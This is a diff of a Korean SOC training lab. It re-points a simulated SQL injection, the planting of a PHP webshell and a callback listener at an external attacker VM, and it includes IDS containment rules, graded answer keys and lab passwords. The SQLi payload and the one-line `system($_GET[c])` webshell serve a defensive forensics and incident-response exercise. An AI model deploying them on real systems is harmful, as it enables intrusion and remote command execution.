@@ -10,8 +10,9 @@ description: |
   audit(왜 막혔나)로 SQLi 침투 → 웹쉘 작성 → 웹쉘 사용(.php?c=) 경로를 복원한다. (2) 호스트 헌팅 — osquery의
   file 테이블로 웹쉘 파일을, listening_ports 테이블로 콜백 채널을 잡는다. 그 뒤 W09의 IR 절차를 웹쉘에 적용해
   Contain(출발지 격리) → Eradicate(웹쉘 rm + 콜백 kill) → Recover(서비스 정상 + 잔재 0)로 발판을 끊는다.
-  격리 룰/웹쉘 재현물은 self-clean(시연 후 스스로 정리, 공유 인프라 보존). 모든 명령은 el34 호스트
-  (`ssh ccc@{{TARGET_IP}}`, 비밀번호 1)에서 docker exec로 실행한다. 자세한 배경은 lecture_week10.md 참고.
+  격리 룰/웹쉘 재현물은 self-clean(시연 후 스스로 정리, 공유 인프라 보존). 침해 유발 공격(재현)은 내 공격 VM
+  `ssh att@192.168.0.202`(비번 1)에서 공인 진입 192.168.0.161로 보내고(출발지 192.168.0.202), 포렌식·헌팅·IR
+  대응은 el34 호스트(`ssh ccc@{{TARGET_IP}}`, 비번 1)에서 docker exec로 한다. 자세한 배경은 lecture_week10.md 참고.
 difficulty: hard
 duration_minutes: 200
 prerequisites:
@@ -81,12 +82,12 @@ steps:
       이후 포렌식·헌팅이 읽어낼 흔적(로그)과 실체(파일·포트)를 만든다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** 침투는 `el34-attacker`, 웹쉘·리스너는 `el34-web`.
+      **실습 컨테이너:** 침투는 `외부 공격자 VM 192.168.0.202`, 웹쉘·리스너는 `el34-web`.
       각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.
 
       ```bash
-      # ── el34-attacker 에서: SQLi 침투 — sqlmap UA 주입(ModSec 942 탐지) ──
-      curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=socw10%27%20UNION%20SELECT%201--%20-"
+      # ── 외부 공격자 VM 192.168.0.202 에서: SQLi 침투 — sqlmap UA 주입(ModSec 942 탐지) ──
+      curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=socw10%27%20UNION%20SELECT%201--%20-"
       # ── el34-web 에서: 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주 ──
       echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted
       # 로그 수렴 대기 후 완료 마커
@@ -103,7 +104,7 @@ steps:
     points: 10
     answer: |
       # 1) SQLi 침투 — sqlmap UA로 주입(ModSec 942 탐지)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=socw10%27%20UNION%20SELECT%201--%20-\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=socw10%27%20UNION%20SELECT%201--%20-\""
       # 2) 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주
       docker exec el34-web sh -c 'echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted'
       # 3) 로그 수렴 대기 후 완료 마커
@@ -236,22 +237,22 @@ steps:
       ## 🎯 목표 — 제거에 앞서 공격 출발지를 격리해 확산 차단 (IDS sid 9510001)
       ## 📖 개념 한 줄
       "차단 우선, 분석 나중"(W09). 분석·제거 도중 추가 침투가 번지지 않게, 먼저 공격 출발지
-      (`10.20.30.202`)를 IDS로 플래그한다. **공유 인프라이므로 drop이 아니라 alert로 격리를 시연**
+      (`192.168.0.202`)를 IDS로 플래그한다. **공유 인프라이므로 drop이 아니라 alert로 격리를 시연**
       하고 직후 self-clean으로 룰을 되돌린다(운영은 firewall drop).
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** 격리 룰·검증·정리는 `el34-ips`, 테스트 트래픽은 `el34-attacker`.
+      **실습 컨테이너:** 격리 룰·검증·정리는 `el34-ips`, 테스트 트래픽은 `외부 공격자 VM 192.168.0.202`.
       각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.
 
       ```bash
-      # ── el34-ips 에서: 격리 룰 추가(출발지 10.20.30.202 플래그, sid 9510001) + reload ──
+      # ── el34-ips 에서: 격리 룰 추가(출발지 192.168.0.202 플래그, sid 9510001) + reload ──
       sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
-      alert ip 10.20.30.202 any -> any any (msg:\"SOC W10 contain webshell attacker\"; sid:9510001; rev:1;)
+      alert ip 192.168.0.202 any -> any any (msg:\"SOC W10 contain webshell attacker\"; sid:9510001; rev:1;)
       EOF"
       sudo suricatasc -c reload-rules
 
-      # ── el34-attacker 에서: 출발지 트래픽 유발 ──
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://10.20.30.1/
+      # ── 외부 공격자 VM 192.168.0.202 에서: 출발지 트래픽 유발 ──
+      curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/
 
       # ── el34-ips 에서: 격리 룰 트리거 횟수(1+) + self-clean(룰 삭제 + reload) (4초 후) ──
       sudo grep -c 9510001 /var/log/suricata/eve.json
@@ -266,18 +267,18 @@ steps:
     category: manipulation
     points: 12
     answer: |
-      # 1) 격리 룰 추가 — 출발지 10.20.30.202 모든 트래픽 플래그(alert, sid 9510001)
+      # 1) 격리 룰 추가 — 출발지 192.168.0.202 모든 트래픽 플래그(alert, sid 9510001)
       docker exec el34-ips sh -c 'sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
-      alert ip 10.20.30.202 any -> any any (msg:\"SOC W10 contain webshell attacker\"; sid:9510001; rev:1;)
+      alert ip 192.168.0.202 any -> any any (msg:\"SOC W10 contain webshell attacker\"; sid:9510001; rev:1;)
       EOF"'
       # 2) 룰 즉시 반영 후 출발지 트래픽 유발
       docker exec el34-ips sh -c 'sudo suricatasc -c reload-rules'; sleep 2
-      docker exec el34-attacker sh -c 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://10.20.30.1/'; sleep 4
+      ssh att@192.168.0.202 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/'; sleep 4
       # 3) 격리 룰 트리거 횟수(1+ = 출발지 포착)
       docker exec el34-ips sh -c 'sudo grep -c 9510001 /var/log/suricata/eve.json'
       # 4) self-clean — 격리 룰 삭제 + reload(공유 인프라 원복)
       docker exec el34-ips sh -c 'sudo sed -i "/sid:9510001/d" /etc/suricata/rules/local.rules; sudo suricatasc -c reload-rules >/dev/null; echo rule_removed'
-    answer_detail: "Contain은 확산을 막는 단계 — 공격 출발지(10.20.30.202)를 IDS sid 9510001로 플래그하고 콜백 포트를 차단한다. 절차: local.rules에 출발지 alert 룰 추가 → reload-rules → 그 출처의 요청으로 트리거 확인(grep -c) → self-clean(룰 삭제 + reload). 공유 el34에서는 drop이 다른 학생 트래픽까지 끊으므로 alert로 격리 메커니즘을 시연하고 정리한다(운영은 firewall drop으로 영구 적용). 채점은 self-clean까지 완료(rule_removed)됨을 본다."
+    answer_detail: "Contain은 확산을 막는 단계 — 공격 출발지(192.168.0.202)를 IDS sid 9510001로 플래그하고 콜백 포트를 차단한다. 절차: local.rules에 출발지 alert 룰 추가 → reload-rules → 그 출처의 요청으로 트리거 확인(grep -c) → self-clean(룰 삭제 + reload). 공유 el34에서는 drop이 다른 학생 트래픽까지 끊으므로 alert로 격리 메커니즘을 시연하고 정리한다(운영은 firewall drop으로 영구 적용). 채점은 self-clean까지 완료(rule_removed)됨을 본다."
     expected_output: |
       {"message": "done", "return": "OK"}
       33
